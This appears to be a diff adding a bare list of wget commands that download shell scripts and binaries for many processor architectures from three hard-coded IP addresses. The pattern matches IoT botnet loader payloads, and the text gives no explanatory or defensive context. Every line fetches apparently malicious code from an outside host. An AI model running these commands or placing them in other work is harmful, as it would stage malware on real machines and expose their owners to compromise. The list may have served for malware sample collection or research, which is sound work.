@@ -1,0 +1,21 @@
+wget http://167.114.155.137/ci.sh
+wget http://167.114.155.137/armeh -O ci_armeh
+wget http://167.114.155.137/mipseh -O ci_mipseh
+wget http://167.114.155.137/mipseleh -O ci_mipseleh
+wget http://93.174.93.187/rftp.sh
+wget http://93.174.93.187/blumips
+wget http://93.174.93.187/blumips64
+wget http://93.174.93.187/blumipsel
+wget http://93.174.93.187/bluarm 
+wget http://93.174.93.187/blush 
+wget http://93.174.93.187/bluppc 
+wget http://93.174.93.187/blui686 
+wget http://93.174.93.187/blux86
+wget http://198.23.135.199/csi.sh
+wget http://198.23.135.199/armeh -O csi_armeh
+wget http://198.23.135.199/mipseh -O csi_mipseh
+wget http://198.23.135.199/mipseleh -O csi_mipseleh
+wget http://198.23.135.199/ics.sh
+wget http://198.23.135.199/areh -O ics_areh
+wget http://198.23.135.199/mipeh -O ics_mipeh
+wget http://198.23.135.199/mipeleh -O ics_mipeleh
